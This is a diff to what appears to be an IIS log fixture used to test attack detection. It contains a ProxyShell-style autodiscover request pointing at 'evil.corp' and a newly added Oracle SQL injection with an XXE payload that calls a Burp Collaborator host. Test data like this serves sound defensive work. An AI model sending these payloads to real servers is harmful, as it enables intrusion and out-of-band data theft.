@@ -5,3 +5,4 @@
 2021-10-09 00:00:01 1.1.1.1 GET /Microsoft-Server-ActiveSync/default.eas &CorrelationID=<empty>;&cafeReqId=abc-123; 443 mailbox@example.com ::1 AMProbe/Local/ClientAccess - 200 0 0 42
 2021-10-09 00:00:01 1.1.1.1 GET /ecp/ &CorrelationID=<empty>;&cafeReqId=abc-123;&LogoffReason=NoCookiesGetOrE14AuthPost 443 - ::1 AMProbe/Local/ClientAccess - 302 0 0 33
 2021-10-09 02:24:04 1.1.1.1 GET /autodiscover/autodiscover.json @evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp&CorrelationID=<empty>;&cafeReqId=abc-123; 443 - 1.1.1.1 python-requests/2.26.0 - 200 0 0 332
+2021-07-15 08:07:36 10.11.12.13 GET /some_url_from_my_website/ - 80 - 13.12.11.10 (select+extractvalue(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+cveec+SYSTEM+"http://ta7y99sc16vh9tvo5z7z1crsxj3cr2f530qqef.burpcollab'||'orator.net/">%cveec;]>'),'/l')+from+dual) - 200 0 0 15
